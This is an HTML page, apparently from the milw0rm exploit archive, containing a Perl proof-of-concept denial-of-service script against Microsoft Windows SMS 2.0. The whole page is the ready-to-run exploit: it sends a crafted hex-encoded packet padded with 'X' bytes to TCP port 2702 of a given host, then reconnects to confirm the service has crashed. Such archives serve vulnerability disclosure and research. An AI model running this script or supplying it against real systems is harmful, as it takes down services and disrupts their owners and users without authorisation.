<html><head><title>MS Windows SMS 2.0 Denial of Service Exploit</title></head><pre>#!/usr/bin/perl

#############################
#
# SMS DOS proof of concept and test code
#
#############################

use Socket;
use IO::Socket;

if (@ARGV != 1)
{
print &quot;usage: $0 &lt;host or ip&gt;\n&quot;;
exit;
}

$host = shift(@ARGV);

$hexmsg = converthex(&quot;5243483016004000524348455858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858&quot;);

print &quot;\nCreating socket for connection to: $host\n\n&quot;;

my $sock1 = IO::Socket::INET-&gt;new (PeerAddr =&gt; $host, PeerPort =&gt; &quot;(2702)&quot;, Proto
=&gt; &quot;tcp&quot;) or die(&quot;Could not create socket: $!\n&quot;);

$sock1-&gt;autoflush(1);

print $sock1 &quot;$hexmsg&quot;;

while (&lt;$sock1&gt;)
{
print;
}

print &quot;\nPacket sent to $host (please wait) ...\n&quot;;

sleep(2);

print &quot;Verifying status of $host ...\n&quot;;

sleep(2);

my $sock2 = IO::Socket::INET-&gt;new (PeerAddr =&gt; $host, PeerPort =&gt; '(2702)', Proto
=&gt; 'tcp') or die(&quot;\nDOS was successful - $host is down ...\n&quot;);

print &quot;\nAttempt was not successful. $host is still alive and responding ...\n&quot;;

close($sock1);
close($sock2);

#############################
# End main code, start subs
#############################

sub converthex
{
local ($l) = @_;
$l =~ s/([0-9a-f]{1,2})\s*/sprintf(&quot;%c&quot;,hex($1))/egi;

return $l;
}

#############################
# End code
#############################

# milw0rm.com [2004-07-24]</pre></html>